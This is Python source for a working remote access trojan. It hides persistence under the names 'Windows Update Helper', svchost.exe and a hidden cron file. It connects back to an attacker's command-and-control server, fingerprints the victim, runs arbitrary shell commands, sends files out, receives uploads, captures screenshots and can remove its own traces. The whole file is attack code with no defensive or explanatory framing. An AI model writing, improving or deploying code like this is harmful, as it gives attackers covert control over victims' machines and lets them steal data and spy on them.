import socket
import subprocess
import os
import sys
import json
import time
import platform
import shutil
import threading
import hashlib
from pathlib import Path
import zlib

# Configuration
C2_HOST = '192.168.1.100'  # Attacker C2 IP
C2_PORT = 443
RECONNECT_INTERVAL = 10
MAX_FILE_CHUNK = 4096 * 16  # Increased buffer size
SCREENSHOT_QUALITY = 70      # For JPEG compression

class VictimServer:
    def __init__(self):
        self.sock = None
        self.platform = platform.system()
        self.session_id = os.urandom(4).hex()
        self.lock = threading.Lock()
        self.persist()
        self.screenshot_count = 0

    def persist(self):
        """Improved persistence mechanism"""
        try:
            if self.platform == 'Windows':
                exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
                if not os.path.exists(exe_path):
                    shutil.copy2(sys.argv[0], exe_path)
                    subprocess.check_call(
                        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        f'/v "Windows Update Helper" /t REG_SZ /d "{exe_path}" /f',
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
            elif self.platform == 'Linux':
                cron_path = '/etc/cron.d/.systemd'
                if not os.path.exists(cron_path):
                    with open(cron_path, 'w') as f:
                        f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
                    os.chmod(cron_path, 0o644)
        except Exception as e:
            pass

    def connect_c2(self):
        """Robust connection handler with keepalive"""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.sock.connect((C2_HOST, C2_PORT))
                self.sock.settimeout(30)
                self.send_system_info()
                return True
            except Exception as e:
                time.sleep(RECONNECT_INTERVAL)

    def send_system_info(self):
        """Enhanced system fingerprinting"""
        info = {
            'id': self.session_id,
            'os': self.platform,
            'hostname': platform.node(),
            'user': os.getenv('USERNAME') or os.getenv('USER'),
            'privilege': 'admin' if os.getuid() == 0 else 'user'
        }
        self._safe_send(json.dumps(info))

    def receive_commands(self):
        """Threaded command handler"""
        while True:
            try:
                cmd = self.sock.recv(MAX_FILE_CHUNK).decode().strip()
                if not cmd:
                    raise ConnectionError("Empty command received")

                # Handle commands in separate threads
                threading.Thread(target=self.process_command, args=(cmd,)).start()

            except socket.timeout:
                self._safe_send(b'<HEARTBEAT>')
            except Exception as e:
                self.connect_c2()

    def process_command(self, cmd):
        """Command router with improved error handling"""
        try:
            if cmd.startswith('download '):
                self.send_file(cmd[9:])
            elif cmd.startswith('upload '):
                self.receive_file(cmd[7:])
            elif cmd == 'screenshot':
                self.take_screenshot()
            elif cmd == 'persist':
                self.persist()
            elif cmd == 'kill':
                self.self_destruct()
            else:
                output = self.execute_command(cmd)
                self._safe_send(output)
        except Exception as e:
            self._safe_send(f"Command failed: {str(e)}")

    def execute_command(self, cmd):
        """Secure command execution with timeout"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=30
            )
            output = result.stdout.decode(errors='replace') or result.stderr.decode(errors='replace')
            return output
        except Exception as e:
            return str(e)

    def send_file(self, file_path):
        """Reliable file transfer with checksum verification"""
        try:
            if not os.path.exists(file_path):
                self._safe_send(f"File not found: {file_path}")
                return

            # Send file metadata
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            file_hash = self._calculate_file_hash(file_path)
            metadata = json.dumps({
                'name': file_name,
                'size': file_size,
                'hash': file_hash
            })
            self._safe_send(metadata.encode())

            # Wait for ACK
            if self.sock.recv(3) != b'ACK':
                raise ConnectionError("No ACK received")

            # Send file content
            sent_bytes = 0
            with open(file_path, 'rb') as f:
                while sent_bytes < file_size:
                    chunk = f.read(MAX_FILE_CHUNK)
                    compressed = zlib.compress(chunk, level=1)
                    self._safe_send(compressed)
                    sent_bytes += len(chunk)

            # Verify transfer
            if self.sock.recv(3) == b'VER':
                self._safe_send(file_hash.encode())

        except Exception as e:
            self._safe_send(f"File transfer failed: {str(e)}")

    def receive_file(self, file_path):
        """Secure file reception with validation"""
        try:
            metadata = json.loads(self.sock.recv(MAX_FILE_CHUNK).decode())
            self._safe_send(b'ACK')

            received = 0
            file_hash = hashlib.sha256()
            with open(file_path, 'wb') as f:
                while received < metadata['size']:
                    chunk = zlib.decompress(self.sock.recv(MAX_FILE_CHUNK))
                    f.write(chunk)
                    file_hash.update(chunk)
                    received += len(chunk)

            # Verify integrity
            if file_hash.hexdigest() == metadata['hash']:
                self._safe_send("File upload successful")
            else:
                os.remove(file_path)
                self._safe_send("File integrity check failed")

        except Exception as e:
            self._safe_send(f"File receive failed: {str(e)}")

    def take_screenshot(self):
        """Enhanced screenshot capture with compression"""
        try:
            from PIL import ImageGrab, Image
            import io

            self.screenshot_count += 1
            filename = f"screenshot_{self.screenshot_count}.jpg"

            # Capture and compress
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=SCREENSHOT_QUALITY)
            buf.seek(0)

            # Save temp file
            with open(filename, 'wb') as f:
                f.write(buf.getvalue())

            # Send and cleanup
            self.send_file(filename)
            os.remove(filename)

        except ImportError:
            self._safe_send("Install Pillow for screenshots: pip install pillow")
        except Exception as e:
            self._safe_send(f"Screenshot failed: {str(e)}")

    def _safe_send(self, data):
        """Thread-safe sending with retries"""
        with self.lock:
            try:
                if isinstance(data, str):
                    data = data.encode()
                self.sock.sendall(len(data).to_bytes(4, 'big'))
                self.sock.sendall(data)
            except Exception as e:
                self.connect_c2()

    def _calculate_file_hash(self, path):
        """Calculate SHA-256 hash of file"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(MAX_FILE_CHUNK)
                if not chunk:
                    break
                sha.update(chunk)
        return sha.hexdigest()

    def self_destruct(self):
        """Thorough cleanup mechanism"""
        try:
            if self.platform == 'Windows':
                subprocess.run(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "Windows Update Helper" /f',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                os.remove(os.path.join(os.getenv('APPDATA'), 'svchost.exe'))
            elif self.platform == 'Linux':
                os.remove('/etc/cron.d/.systemd')
        finally:
            sys.exit(0)

    def start(self):
        """Main execution with watchdog"""
        while True:
            try:
                if self.connect_c2():
                    self.receive_commands()
            except Exception as e:
                time.sleep(RECONNECT_INTERVAL)

if __name__ == '__main__':
    VictimServer().start()